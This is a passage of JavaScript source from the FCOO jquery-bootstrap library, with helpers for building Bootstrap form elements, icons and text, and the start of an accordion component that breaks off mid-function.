/****************************************************************************
    jquery-bootstrap.js,

    (c) 2017, FCOO

    https://github.com/fcoo/jquery-bootstrap
    https://github.com/fcoo

****************************************************************************/

(function ($, i18next, window, document, undefined) {
    "use strict";

    /*

    Almost all elements comes in two sizes: normal and small set by options.small: false/true

    In jquery-bootstrap.scss sizing class-postfix -xs is added (from Bootstrap 3)

    Elements to click or touch has a special implementation:
    For device with 'touch' the Bootstrap size 'normal' and 'small' are used
    For desktop (only mouse) we using smaller version (large = Bootstrap normal, normal = Bootstrap small, small = Bootstrap x-small)

    The variable window.bsIsTouch must be overwriten with the correct value in the application

    */

    //Create namespace
    var ns = window;

    /*
    Create $.BSASMODAL = record with {className: asModal-function} where className is added to any $element that have a asModal-function
    Ex.:
    $.BSASMODAL['BSTABLE'] = function(){ //Create bsModal for this }
    var myTable = $.bsTable({...}); //Add 'BSTABLE' to class-name for  result
    myTable.asModal({...});
    */

    $.BSASMODAL = $.BSASMODAL || {};
    $.fn.asModal = function(options){
        var _this   = this,
            asModal = null;

        $.each($.BSASMODAL, function(id, asModalFunc){
            if (_this.hasClass(id)){
                asModal = asModalFunc;
                return false;
            }
        });
        return asModal ? $.proxy(asModal, this)( options ) : null;
    };


    //Allow test-pages to set bsIsTouch to fixed value
    ns.bsIsTouch = typeof ns.bsIsTouch == "boolean" ? ns.bsIsTouch : true;

    $.EMPTY_TEXT = '___***EMPTY***___';

    //FONTAWESOME_PREFIX = the classname-prefix used when non is given. Fontawesome 4.X: 'fa', Fontawesome 5: Free: 'fas' Pro: 'far' or 'fal'
    $.FONTAWESOME_PREFIX = $.FONTAWESOME_PREFIX || 'fa';


    //FONTAWESOME_PREFIX_STANDARD = the classname-prefix used for buttons in standard radio/checkbox-buttons and icons in modal header. Fontawesome 5: Free: 'far'
    $.FONTAWESOME_PREFIX_STANDARD = $.FONTAWESOME_PREFIX_STANDARD || 'far';


    //ICONFONT_PREFIXES = STRING or []STRING with regexp to match class-name setting font-icon class-name. Fontawesome 5: 'fa.?' accepts 'fas', 'far', etc. as class-names => will not add $.FONTAWESOME_PREFIX
    $.ICONFONT_PREFIXES = 'fa.?';

    /******************************************************
    $divXXGroup
    ******************************************************/
    function $divXXGroup( groupTypeClass, options ){
        return $('<div/>')
                   ._bsAddBaseClassAndSize( $.extend({}, options, {
                       baseClass   : groupTypeClass,
                       useTouchSize: true
                   }));
    }

    //$._bsAdjustIconAndText: Adjust options to fit with {icon"...", text:{da:"", en:".."}
    // options == {da:"..", en:".."} => return {text: options}
    // options == array of ??        => array of $._bsAdjustIconAndText( ??? )
    // options == STRING             => return {text: options}

    $._bsAdjustIconAndText = function( options ){
        if (!options)
            return options;
        if ($.isArray( options )){
            var result = [];
            $.each( options, function(index, content){
                result.push( $._bsAdjustIconAndText(content) );
            });
            return result;
        }

        if ($.type( options ) == "object"){
            if (!options.icon && !options.text)
                return {text: options };
            else
                return options;
        }
        else
            //options == simple type (string, number etc.)
            return {text: options };

    };

    //$._bsAdjustText: Adjust options to fit with {da:"...", en:"..."}
    // options == {da:"..", en:".."} => return options
    // options == STRING             => return {da: options}
    $._bsAdjustText = function( options ){
        if (!options)
            return options;
        if ($.type( options ) == "string")
            return {da: options, en:options};
        return options;
    };

    //$._bsAdjustOptions: Adjust options to allow text/name/header etc.
    $._bsAdjustOptions = function( options, defaultOptions, forceOptions ){
        //*********************************************************************
        //adjustContentOptions: Adjust options for the content of elements
        function adjustContentAndContextOptions( options, context ){
            options.iconClass = options.iconClass || options.iconClassName;
            options.textClass = options.textClass || options.textClassName;

            //If context is given => convert all function to proxy
            if (context)
                $.each( options, function( id, value ){
                    if ($.isFunction( value ))
                        options[id] = $.proxy( value, context );
                });

            return options;
        }
        //*********************************************************************

        options = $.extend( true, {}, defaultOptions || {}, options, forceOptions || {} );

        $.each(['selected', 'checked', /*v3 'active',*/ 'open', 'isOpen'], function(index, id){
            if (options[id] !== undefined){
                options.selected = !!options[id];
                return false;
            }
        });

        options.list = options.list || options.buttons || options.items || options.children;

        options = adjustContentAndContextOptions( options, options.context );

        //Adjust options.content
        if (options.content){
            if ($.isArray( options.content ) )
                //Adjust each record in options.content
                for (var i=0; i<options.content.length; i++ )
                    options.content[i] = adjustContentAndContextOptions( options.content[i], options.context );
            else
                if ($.type( options.content ) == "object")
                    options.content = adjustContentAndContextOptions( options.content, options.context );
        }

        //Sert context = null to avoid "double" proxy
        options.context = null;

        return options;
    };


    /****************************************************************************************
    _bsGetSizeClass
    baseClass: "BASE" useTouchSize: false
        small: false => sizeClass = ''
        small: true  => sizeClass = "BASE-sm"

    baseClass: "BASE" useTouchSize: true
        small: false => sizeClass = 'BASE-sm'
        small: true  => sizeClass = "BASE-xs"
    ****************************************************************************************/
    $._bsGetSizeClass = function( options ){
        var sizeClassPostfix = '';

        if (options.useTouchSize){
            if (ns.bsIsTouch)
                sizeClassPostfix = options.small ? 'sm' : '';
            else
                sizeClassPostfix = options.small ? 'xs' : 'sm';
        }
        else
            sizeClassPostfix = options.small ? 'sm' : '';

        return sizeClassPostfix && options.baseClass ? options.baseClass + '-' + sizeClassPostfix : '';
    };


    /****************************************************************************************
    $._bsCreateElement = internal method to create $-element
    ****************************************************************************************/
    $._bsCreateElement = function( tagName, link, title, textStyle, className, data ){
        var $result;
        if (link){
            $result = $('<a/>');
            if ($.isFunction( link ))
                $result
                    .prop('href', 'javascript:undefined')
                    .on('click', link );
            else
                $result
                    .i18n(link, 'href')
                    .prop('target', '_blank');
        }
        else
            $result = $('<'+tagName+'/>');

        if (title)
            $result.i18n(title, 'title');

        $result._bsAddStyleClasses( textStyle || '' );

        if (className)
            $result.addClass( className );

        if (data)
            $result.data( data );

        return $result;
    };

    /****************************************************************************************
    $._bsCreateIcon = internal method to create $-icon
    ****************************************************************************************/
    var iconfontPrefixRegExp = null;
    $._bsCreateIcon = function( options, $appendTo, title, className/*, insideStack*/ ){
        if (!iconfontPrefixRegExp){
            var prefixes = $.isArray($.ICONFONT_PREFIXES) ? $.ICONFONT_PREFIXES : [$.ICONFONT_PREFIXES];
            iconfontPrefixRegExp = new window.RegExp('(\\s|^)(' + prefixes.join('|') + ')(\\s|$)', 'g');
        }

        var $icon;

        if ($.type(options) == 'string')
            options = {class: options};

        if ($.isArray( options)){
            //Create a stacked icon
             $icon = $._bsCreateElement( 'div', null, title, null, 'container-stacked-icons ' + (className || '')  );

            $.each( options, function( index, opt ){
                $._bsCreateIcon( opt, $icon, null, 'stacked-icon' );
            });

            //If any of the stacked icons have class fa-no-margin, width-1-Xem => set if on the container
            ['fa-no-margin', 'width-1-1em', 'width-1-2em', 'width-1-3em', 'width-1-4em', 'width-1-5em'].forEach( (className) => {
                if ($icon.find('.'+className).length)
                    $icon.addClass(className);
            });
        }
        else {
            var allClassNames = options.icon || options.class || '';

            //Append $.FONTAWESOME_PREFIX if icon don't contain fontawesome prefix ("fa?")
            if (allClassNames.search(iconfontPrefixRegExp) == -1)
                allClassNames = $.FONTAWESOME_PREFIX + ' ' + allClassNames;

            allClassNames = allClassNames + ' ' + (className || '');

            $icon = $._bsCreateElement( 'i', null, title, null, allClassNames );

        }
        $icon.appendTo( $appendTo );
        return $icon;
    };

    /****************************************************************************************
    $._isEqual(obj1, obj2 OR array)
    Check if two objects or arrays are equal
    (c) 2017 Chris Ferdinandi, MIT License, https://gomakethings.com
    @param  {Object|Array|String}  value  The first object or array to compare
    @param  {Object|Array|String}  other  The second object or array to compare
    @return {Boolean}              Returns true if they're equal
    ****************************************************************************************/
    $._isEqual = function (value, other) {
        // Get the value type
        var type = Object.prototype.toString.call(value);

        // If the two objects are not the same type, return false
        if (type !== Object.prototype.toString.call(other)) return false;

        // Compare the length of the length of the two items
        var valueLen = type === '[object Array]' ? value.length : Object.keys(value).length;
        var otherLen = type === '[object Array]' ? other.length : Object.keys(other).length;
        if (valueLen !== otherLen) return false;

        // Compare two items
        var compare = function (item1, item2) {
            // Get the object type
            var itemType = Object.prototype.toString.call(item1);

            // If an object or array, compare recursively
            if (['[object Array]', '[object Object]'].indexOf(itemType) >= 0) {
                if (!$._isEqual(item1, item2)) return false;
            }
            // Otherwise, do a simple comparison
            else {
                // If the two items are not the same type, return false
                if (itemType !== Object.prototype.toString.call(item2)) return false;

                // Else if it's a function, convert to a string and compare
                // Otherwise, just compare
                if (itemType === '[object Function]') {
                    if (item1.toString() !== item2.toString())
                        return false;
                }
                else {
                    if (item1 !== item2) return false;
                }
            }
        };

        // Compare properties
          if (type === '[object Array]'){
               for (var i=0; i<valueLen; i++){
                if (compare(value[i], other[i]) === false)
                    return false;
            }
        }
        else
            if (type === '[object Object]'){
                for (var key in value){
                    if ( (value.hasOwnProperty(key)) && (compare(value[key], other[key]) === false))
                        return false;
                }
            }
            else
                // If nothing failed, return simple comparison
                return value == other;

        return true;
    };


    //$.parentOptionsToInherit = []ID = id of options that modal-content can inherit from the modal itself
    $.parentOptionsToInherit = ['small'];

    $.fn.extend({
        //_bsAddIdAndName
        _bsAddIdAndName: function( options ){
            this.attr('id', options.id || '');
            this.attr('name', options.name || options.id || '');
            return this;
        },

        /****************************************************************************************
        _bsAddBaseClassAndSize

        Add classes

        options:
            baseClass           [string]
            baseClassPostfix    [string]
            styleClass          [string]
            class               [string]
            textStyle           [string] or [object]. see _bsAddStyleClasses
        ****************************************************************************************/
        _bsAddBaseClassAndSize: function( options ){
            var classNames = options.baseClass ? [options.baseClass + (options.baseClassPostfix || '')] : [];

            classNames.push( $._bsGetSizeClass(options) );

            if (options.styleClass)
                classNames.push( options.styleClass );

            if (options.class)
                classNames.push( options.class );

            this.addClass( classNames.join(' ') );

            this._bsAddStyleClasses( options.textStyle );

            return this;
        },

        /****************************************************************************************
        _bsAddStyleClasses
        Add classes for text-styel

        options [string] or [object]
            Style for the contents. String or object with part of the following
            "left right center lowercase uppercase capitalize normal bold italic" or
            {left: true, right: true, center: true, lowercase: true, uppercase: true, capitalize: true, normal: true, bold: true, italic: true}
        ****************************************************************************************/
        _bsAddStyleClasses: function( options = {}){
            var _this = this,

                bsStyleClass = {
                    //Text color
                    "primary"     : "text-primary",
                    "secondary"   : "text-secondary",
                    "success"     : "text-success",
                    "danger"      : "text-danger",
                    "warning"     : "text-warning",
                    "info"        : "text-info",
                    "light"       : "text-light",
                    "dark"        : "text-dark",

                    //Align
                    "left"        : "text-left",
                    "right"       : "text-right",
                    "center"      : "text-center",

                    //Case
                    "lowercase"   : "text-lowercase",
                    "uppercase"   : "text-uppercase",
                    "capitalize"  : "text-capitalize",

                    //Weight
                    "normal"      : "fw-normal",
                    "bold"        : "fw-bold",
                    "italic"      : "fst-italic"
                };

            $.each( bsStyleClass, function( style, className ){
                if (
                      ( (typeof options == 'string') && (options.indexOf(style) > -1 )  ) ||
                      ( (typeof options == 'object') && (options[style]) )
                    )
                    _this.addClass( className );
            });
            return this;
        },

        /****************************************************************************************
        _bsAddHtml
        Internal methods to add innerHTML to button or other element
        options: array of textOptions or textOptions
        textOptions: {
            icon     : String / {class, data, attr} or array of String / {className, data, attr}
            text     : String or array of String
            vfFormat : String or array of String
            vfValue  : any type or array of any-type
            vfOptions: JSON-object or array of JSON-object
            textStyle: String or array of String
            link     : String or array of String
            title    : String or array of String
            iconClass: string or array of String
            textClass: string or array of String
            textData : obj or array of obj
        }
        checkForContent: [Boolean] If true AND options.content exists => use options.content instead
        ****************************************************************************************/

        _bsAddHtml:  function( options, htmlInDiv, ignoreLink, checkForContent ){

            //**************************************************
            function getArray( input ){
                return input ? ($.isArray( input ) ? input : [input]) : [];
            }
            //**************************************************
            function isHtmlString( str ){
                if (!htmlInDiv || ($.type(str) != 'string')) return false;

                var isHtml = false,
                    $str = null;
                try       { $str = $(str); }
                catch (e) { $str = null;   }

                if ($str && $str.length){
                    isHtml = true;
                    $str.each( function( index, elem ){
                        if (!elem.nodeType || (elem.nodeType != 1)){
                            isHtml = false;
                            return false;
                        }
                    });
                }
                return isHtml;
            }

            //**************************************************
            options = options || '';

            if (options.content && checkForContent)
                return this._bsAddHtml(options.content, htmlInDiv, ignoreLink);

            var _this = this;

            //options = array => add each
            if ($.isArray( options )){
                $.each( options, function( index, textOptions ){
                    _this._bsAddHtml( textOptions, htmlInDiv, ignoreLink );
                });
                return this;
            }

            this.addClass('container-icon-and-text');

            //If the options is a jQuery-object: append it and return
            if (options.jquery){
                this.append( options );
                return this;
            }

            //If the content is a string containing html-code => append it and return
            if (isHtmlString(options)){
                this.append( $(options) );
                return this;
            }

            //Adjust icon and/or text if it is not at format-options
            if (!options.vfFormat)
                options = $._bsAdjustIconAndText( options );

            //options = simple textOptions
            var iconArray       = getArray( options.icon ),
                textArray       = getArray( options.text ),
                vfFormatArray   = getArray( options.vfFormat ),
                vfValueArray    = getArray( options.vfValue ),
                i18nextArray    = getArray( options.i18next ),
                vfOptionsArray  = getArray( options.vfOptions ),
                textStyleArray  = getArray( options.textStyle ),
                linkArray       = getArray( ignoreLink ? [] : options.link || options.onClick ),
                titleArray      = getArray( options.title ),
                iconClassArray  = getArray( options.iconClass ),
                textClassArray  = getArray( options.textClass ),
                textDataArray   = getArray( options.textData );

            //Add icons (optional)
            $.each( iconArray, function( index, icon ){
                $._bsCreateIcon( icon, _this, titleArray[ index ], iconClassArray[index] );
            });

            //Add color (optional)
            if (options.color)
                _this.addClass('text-'+ options.color);

            //Add text
            $.each( textArray, function( index, text ){
                //If text ={da,en} and both da and is html-stirng => build inside div
                var tagName = 'span';
                if ( (text.hasOwnProperty('da') && isHtmlString(text.da)) || (text.hasOwnProperty('en') && isHtmlString(text.en)) )
                    tagName = 'div';

                var $text = $._bsCreateElement( tagName, linkArray[ index ], titleArray[ index ], textStyleArray[ index ], textClassArray[index], textDataArray[index] );
                $text.appendTo( _this );

                if ($.isFunction( text ))
                    text( $text );
                else
                    if (text == $.EMPTY_TEXT)
                        $text.html( '&nbsp;');
                    else
                        if (text != ""){
                            //If text is a string and not a key to i18next => just add the text
                            if ( ($.type( text ) == "string") && !i18next.exists(text) )
                                $text.html( text );
                            else
                                $text.i18n( text, 'html', i18nextArray[ index ] );
                        }

                if (index < textClassArray.length)
                    $text.addClass( textClassArray[index] );

            });

            //Add value-format content
            $.each( vfFormatArray, function( index ){
                $._bsCreateElement( 'span', linkArray[ index ], titleArray[ index ], textStyleArray[ index ], textClassArray[index] )
                    .vfValueFormat(
                        vfValueArray[index] || '',
                        vfFormatArray[index],
                        vfOptionsArray[index]
                    )
                    .appendTo( _this );
            });

            return this;
        },

        //_bsButtonOnClick
        _bsButtonOnClick: function(){
            var options = this.data('bsButton_options');
            $.proxy( options.onClick, options.context )( options.id, null, this );
            return options.returnFromClick || false;
        },

        /****************************************************************************************
        _bsAppendContent( options, context, arg, parentOptions )
        Create and append any content to this.
        options can be $-element, function, json-object or array of same

        If parentOptions is given => some options from parentOptions is used if they are not given in options


        See src/_form.scss for description of the structure
        ****************************************************************************************/
        _bsAppendContent: function( options, context, arg, parentOptions = {} ){

            //Internal functions to create baseSlider and timeSlider
            function buildSlider(options, constructorName, $parent){
                var $sliderInput = $('<input/>').appendTo( $parent ),
                    slider = $sliderInput[constructorName]( options ).data(constructorName),
                    $element = slider.cache.$outerContainer || slider.cache.$container;

                $element
                    .attr('id', options.id)
                    .data('slider', slider );
            }
            function buildBaseSlider(options, $parent){ buildSlider(options, 'baseSlider', $parent); }
            function buildTimeSlider(options, $parent){ buildSlider(options, 'timeSlider', $parent); }


            //buildCompactText - Compact box with label-icon to the left
            function buildCompactText( options ){
                var $result = $();
                options.title = options.title || (options.label ? options.label.text : null);
                $result = $result.add(
                    $._bsCreateIcon(
                        {icon: options.label ? options.label.icon : 'fas fa_'},
                        null,
                        options.title,
                        'part-of-compact-text fa-fw text-center flex-grow-0 align-self-center'
                    )
                );

                var $content = $('<div/>')
                        ._bsAddHtml( options )
                        .addClass('flex-grow-1');

                if (options.title)
                    $content.i18n(options.title, 'title');

                return $result.add( $content );
            }


            //buildTextBox - Simple multi-line text-box
            function buildTextBox( options ){
                return $('<div/>')
                        ._bsAddHtml( options )
                        .addClass('input-group-with-text');
            }

            //buildInlineTextBox - Inline (pre/post) with single line text
            function buildInlineTextBox( options ){
                var $inner =
                        $('<div/>')
                           ._bsAddHtml( options )
                            ._bsAddBaseClassAndSize({baseClass: 'form-control', useTouchSize: true})
                           .addClass('no-hover');

                return options.label ? $inner._wrapLabel(options) : $inner;
            }


            function buildHidden( options ){
                return $.bsInput( options ).css('display', 'none');
            }

            function buildFormControlGroup( options, $parent ){
                return $parent
                           .attr('id', options.id)
                           .addClass('flex-column')
                           ._bsAppendContent(options.content, null, null, options);
            }

            if (!options)
                return this;

            //Array of $-element, function etc
            if ($.isArray( options )){
                var _this = this;
                $.each(options, function( index, opt){
                    _this._bsAppendContent(opt, context, null, parentOptions );
                });
                return this;
            }

            //Function: Include arg (if any) in call to method (=options)
            if ($.isFunction( options )){
                arg = arg ? ($.isArray(arg) ? arg.slice() : [arg]) : [];
                arg.unshift(this);
                options.apply( context, arg );
                return this;
            }

            if (!$.isPlainObject(options)){
                //Assume it is a $-element or other object that can be appended directly
                this.append( options );
                return this;
            }

            //json-object with options to create bs-elements
            var buildFunc = $.fn._bsAddHtml,
                insideFormGroup   = false,
                addBorder         = false,
                buildInsideParent = false,
                noPadding         = false,
                isButtonType      = false,
                noValidation      = false;


            //Set values fro parentOptions into options
            $.each($.parentOptionsToInherit, function(index, id){
                if (parentOptions.hasOwnProperty(id) && !options.hasOwnProperty(id))
                    options[id] = parentOptions[id];
            });

            var hasPreOrPost = options.prepend || options.before || options.append || options.after;

            if (options.type){
                var type = options.type.toLowerCase();
                switch (type){
                    case 'button'                : buildFunc = $.bsButton;                  isButtonType = true; break;

                    case 'checkboxbutton'        : buildFunc = $.bsCheckboxButton;          isButtonType = true; break;
                    case 'standardcheckboxbutton': buildFunc = $.bsStandardCheckboxButton;  isButtonType = true; break;
                    case 'iconcheckboxbutton'    : buildFunc = $.bsIconCheckboxButton;      isButtonType = true; break;
                    case 'bigiconbutton'         : buildFunc = $.bsBigIconButton;           isButtonType = true; break;


                    case 'buttongroup'           : buildFunc = $.bsButtonGroup;             insideFormGroup = true; break;

                    case 'menu'             :   buildFunc = $.bsMenu;               break;
                    case 'selectbox'        :
                    case 'select'           :   buildFunc = $.bsSelect;             insideFormGroup = true; break;

                    case 'selectlist'       :   buildFunc = $.bsSelectList;         break;
                    case 'selectbutton'     :   buildFunc = $.bsSelectButton;       isButtonType = true; break;

                    case 'radiobuttongroup' :   buildFunc = $.bsRadioButtonGroup;   addBorder = true; insideFormGroup = true; break;
                    case 'checkbox'         :   buildFunc = $.bsCheckbox;           insideFormGroup = true; noPadding = true; break;

                    case 'carousel'         :   buildFunc = $.bsCarousel;           /*Possible: addBorder = true; insideFormGroup = true; noPadding = true; */ break;

                    case 'progressbar'      :   buildFunc = $.bsProgressBar;        /*Possible: addBorder = true; insideFormGroup = true; noPadding = true; */ break;

                    case 'tabs'             :   buildFunc = $.bsTabs;               break;
                    case 'table'            :   buildFunc = $.bsTable;              break;
                    case 'list'             :   buildFunc = $.bsList;               break;
                    case 'accordion'        :   buildFunc = $.bsAccordion;          break;
                    case 'slider'           :   buildFunc = buildBaseSlider;        insideFormGroup = true; addBorder = true; buildInsideParent = true; break;
                    case 'timeslider'       :   buildFunc = buildTimeSlider;        insideFormGroup = true; addBorder = true; buildInsideParent = true; break;


                    case 'compact'          :
                    case 'conpacttext'      :   buildFunc = buildCompactText;
                                                options.noLabel = true; options.noVerticalPadding = true;
                                                insideFormGroup = true; addBorder = true; noValidation = true; break;
                    case 'text'             :
                    case 'textarea'         :
                    case 'textbox'          :   insideFormGroup = true;
                                                if (!options.vfFormat)
                                                    options.text = options.text || $.EMPTY_TEXT;
                                                if (hasPreOrPost)
                                                    buildFunc = buildInlineTextBox;
                                                else {
                                                    if (options.compact){
                                                        //Same as type="compacttext" but with outer padding
                                                        buildFunc = buildCompactText;
                                                        options.noLabel = true;
                                                    }
                                                    else
                                                        buildFunc = buildTextBox;
                                                    addBorder = true; noValidation = true;
                                                }
                                                break;

                    case 'fileview'         :   buildFunc = $.bsFileView;           break;
                    case 'hidden'           :   buildFunc = buildHidden;            noValidation = true; break;

                    case 'input'            :   buildFunc = $.bsInput;              insideFormGroup = true; break;

                    case 'formControlGroup' :
                    case 'inputgroup'       :   buildFunc = buildFormControlGroup;  addBorder = true; insideFormGroup = true; buildInsideParent = true; break;
//                    case 'xx'               :   buildFunc = $.bsXx;               break;

                    default                 :   buildFunc = $.fn._bsAddHtml;        noPadding = true; buildInsideParent = true;
                }
            }


            //Button'ish elemnts get inside a formgroup if there are label or border
            if (isButtonType)
                if ((options.label && !options.noLabel) || options.border){
                    addBorder = true;
                    insideFormGroup = true;
                }

            if (options.lineBefore || options.lineAfter)
                insideFormGroup = true;

            //Overwrite insideFormGroup if value given in options
            if ( $.type( options.insideFormGroup ) == "boolean")
                insideFormGroup = options.insideFormGroup;

            //Overwrite noPadding if value given in options
            if ( $.type( options.noPadding ) == "boolean")
                noPadding = options.noPadding;

            //Set the parent-element where to append to created element(s)
            var $parent = this,
                insideInputGroup = false;

            if (insideFormGroup){
                //Create outer input-group-container
                insideInputGroup = true;
                $parent =
                    $divXXGroup('input-group-container', options)
                        .toggleClass('small-bottom-padding', !!options.smallBottomPadding)
                        .toggleClass('py-0',                 !!options.noVerticalPadding)
                        .toggleClass('line-before',          !!options.lineBefore)
                        .toggleClass('line-after',           !!options.lineAfter)

                        .toggleClass('no-validation',        !!(noValidation || options.noValidation))  //HER skal den bruges hvis der bruges tooltips til validation errors?

                        .appendTo( $parent );
            }

            if (insideInputGroup || hasPreOrPost){
                //Create element inside input-group
                var $inputGroup =
                        $divXXGroup('input-group', options)
                            .toggleClass('p-0', !!noPadding),
                    hasLabel = options.label && !options.noLabel;

                if (addBorder && !options.noBorder){
                    //Add border and label (if any)
                    $inputGroup.addClass('input-group-border');

                    if (options.darkBorderlabel)
                        $inputGroup.addClass('input-group-border-dark');

                    if (hasLabel)
                         $('<label/>')
                            .addClass('label-outside label-content')
                            ._bsAddHtml( options.label )
                            .appendTo( $inputGroup );
                }
                else
                    //No-border => the input-group is just a container to keep vertival distance => no horizontal padding
                    $inputGroup.addClass('px-0');

                if (hasLabel)
                    $parent.addClass('child-with-label');

                $parent = $inputGroup.appendTo( $parent );
            }

            $parent._bsAppendContent( options.prepend || options.before, options.contentContext, null, options  );

            //Build the element. Build inside $parent or add to $parent after
            if (buildInsideParent)
                buildFunc.call( this, options, $parent );
            else
                buildFunc.call( this, options ).appendTo( $parent );

            if (options.center)
                $parent.addClass('justify-content-center text-center');

            $parent._bsAppendContent( options.append || options.after, options.contentContext, null, options  );

            return this;
        }   //end of _bsAppendContent
    }); //$.fn.extend


}(jQuery, this.i18next, this, document));

;
/****************************************************************************
	jquery-bootstrap-accordion.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($ /*, window, document, undefined*/) {
	"use strict";

    // Create $.BSASMODAL - See src/jquery-bootstrap.js for details
    $.BSASMODAL = $.BSASMODAL || {};

    //Add/Remove class "show" to .card
    function card_onShown(){
        var $this = $(this);
        if ($this.children('.collapse.show').length)
            $this.addClass('show');
    }

    function card_onHidden(){
        var $this = $(this);
        if (!$this.children('.collapse.show').length)
            $this.removeClass('show');
        accordion_onChange($this);
    }

    //card_onShow_close_siblings: Close all open siblings when card is shown
    function card_onShow_close_siblings(){
        var $this = $(this);
        $this.siblings('.show').children('.collapse').collapse('hide');
    }

    //card_onShown_close_siblings: Close all open siblings when card is shown BUT without animation
    function card_onShown_close_siblings(){
        var $this = $(this);
        if ($this.hasClass('show')){
            $this.addClass('no-transition');
            card_onShow_close_siblings.call(this);
            $this.removeClass('no-transition');
        }
        accordion_onChange($this);
    }

    //update_status: Create a
    function accordion_onChange($element){
        var $accordion = $element.parents('.accordion').last(),
            onChange = $accordion.data('accordion_onChange');
        if (onChange)
            onChange($accordion, $accordion.bsAccordionStatus());
    }


    /**********************************************************
    bsAccordion( options ) - create a Bootstrap-accordion

    <div id="accordion" class="accordion accordion-sm" role="tablist" aria-multiselectable="true">
        <div class="card">
            <div class="card-header" role="tab" id="headingOne" data-bs-toggle="collapse" _data-parent="#accordion" href="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
                <i class="fa fa-home"></i>&nbsp;<span>Den nye overskrift</span>
            </div>
            <div id="collapseOne" class="collapse _show" role="tabpanel" aria-labelledby="headingOne">
                <div class="card-block">
                    This is the content
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header" role="tab" id="headingTwo" data-bs-toggle="collapse" _data-parent="#accordion" href="#collapseTwo" aria-expanded="true" aria-controls="collapseTwo">
                <i class="fa fa-home"></i>&nbsp;<span>Den nye overskrift</span>
            </div>
        <div id="collapseTwo" class="collapse" role="tabpanel" aria-labelledby="headingTwo">
            <div class="card-block">
                Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod. Brunch 3 wolf moon tempor, sunt aliqua put a bird on it squid single-origin coffee nulla assumenda shoreditch et. Nihil anim keffiyeh helvetica, craft beer labore wes anderson cred nesciunt sapiente ea proident. Ad vegan excepteur butcher vice lomo. Leggings occaecat craft beer farm-to-table, raw denim aesthetic synth nesciunt you probably haven't heard of them accusamus labore sustainable VHS.
            </div>
        </div>
    </div>

    <div class="accordion accordion-flush" id="accordionFlushExample">
        <div class="accordion-item">
            <h2 class="accordion-header" id="flush-headingOne">
                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#flush-collapseOne" aria-expanded="false" aria-controls="flush-collapseOne">
                    Accordion Item #1
                </button>
            </h2>
            <div id="flush-collapseOne" class="accordion-collapse collapse" aria-labelledby="flush-headingOne" data-bs-parent="#accordionFlushExample">
                <div class="accordion-body">Placeholder content for this accordion, which is intended to demonstrate the <code>.accordion-flush</code> class. This is the first item's accordion body.</div>
            </div>
        </div>
    ..another <div class="accordion-item">...</div>
    </div>
    **********************************************************/
    var accordionId = 0;

    $.BSASMODAL.BSACCORDION = function( options ){
        return $.bsModal( $.extend( {
                              flexWidth: true,
                              content  : this,
                          }, options)
               );
    };

    $.bsAccordion = function( options ){
        var id = 'bsAccordion'+ accordionId++;
        options =
            $._bsAdjustOptions( options, {}, {
                baseClass   : 'accordion',
                styleClass  : '',
                content     : ''
            });

        if (options.neverClose){
            options.multiOpen = true;
            options.allOpen   = true;
        }

        var $result = $('<div/>')
                        .addClass('BSACCORDION')
                        ._bsAddBaseClassAndSize( options )
                        .attr({
                            'id'      : id,
                            'tabindex': -1,
                        });

        //Adding the children {icon, text, content}
        $.each( options.list, function( index, opt ){
            //Create the header
            opt = $._bsAdjustOptions( opt );

            var headerId   = id + 'header'+index,
                collapseId = id + 'collapse'+index,
                isOpen     = !!options.allOpen || !!opt.selected,
                $accordionItem = $('<div/>')
                    .addClass('accordion-item')
                    .toggleClass('show', isOpen)
                    .attr({'data-user-id': opt.id || null})
                    .on( 'shown.bs.collapse',  card_onShown )
                    .on( 'hidden.bs.collapse', card_onHidden )
                    .on( 'show.bs.collapse',   options.multiOpen ? null : card_onShow_close_siblings )
                    .on( 'shown.bs.collapse',  options.multiOpen ? null : card_onShown_close_siblings )
                    .appendTo( $result ),
                headerAttr = {
                    'id'  : headerId,
                    'role': 'tab',
                };

            //Add header
            if (!options.neverClose)
                $.extend(headerAttr, {
                    'data-bs-toggle': "collapse",
                    'data-parent'   : '#'+id,
                    'href'          : '#'+collapseId,
                    'aria-expanded' : true,
                    'aria-controls' : collapseId,
                    'aria-target'   : '#'+collapseId
                });

            var $accordionHeader = $('<div/>')
                    .addClass('accordion-header')
                    .attr('id', headerId)
                    .appendTo( $accordionItem );

            var $accordionButton = $('<button type="button"/>')
                    .addClass('accordion-button')
                    .toggleClass('collapsed', !isOpen)
                    ._bsAddHtml( $.extend({text:'&nbsp;'}, opt.header || opt )) //'&nbsp;' = bug fix to prevent header without text to be wronge height - not pretty :-)
                    .toggleClass('accordion-never-close', !!options.neverClose)
                    .appendTo( $accordionHeader );

            if (!options.neverClose)
                $.extend(headerAttr, {
                    'data-bs-toggle': "collapse",
                    'data-bs-target': '#'+collapseId,
                });

            $accordionButton.attr(headerAttr);

            //Add content-container
            var $outer =
                $('<div/>')
                    .addClass('collapse')
                    .toggleClass('show', isOpen)
                    .attr({
                        'id'             : collapseId,
                        'role'           : 'tabpanel',
                        'aria-labelledby': headerId
                    })
                    .appendTo( $accordionItem ),

                $contentContainer =
                    $('<div/>')
                        .addClass('accordion-body')
                        .toggleClass('no-vertical-padding', !!opt.noVerticalPadding)
                        .toggleClass('no-horizontal-padding', !!opt.noHorizontalPadding)
                        .addClass(opt.class || '')
                        .addClass(opt.className || '')
                        .appendTo( $outer );

            //Add footer
            if (opt.footer)
                $('<div/>')
                    .addClass('accordion-footer')
                    ._bsAddHtml( opt.footer )
                    .appendTo( $outer );

            //Add content: string, element, function or children (=accordion)
            if (opt.content)
                $contentContainer._bsAppendContent( opt.content, opt.contentContext, null, options );

            //If opt.list exists => create a accordion inside $contentContainer
            if ($.isArray(opt.list))
                $.bsAccordion( {
                    allOpen   : options.allOpen,
                    multiOpen : options.multiOpen,
                    neverClose: options.neverClose,
                    list: opt.list
                } )
                    .appendTo( $contentContainer );


        }); //End of $.each( options.list, function( index, opt ){

        if (options.onChange){
            $result.data('accordion_onChange', options.onChange);
            options.onChange($result, $result.bsAccordionStatus());
        }
        return $result;
    };

    //Extend $.fn with method to get status for an accordion open/slose status
    $.fn.bsAccordionStatus = function(){
        function getStatus($elem){
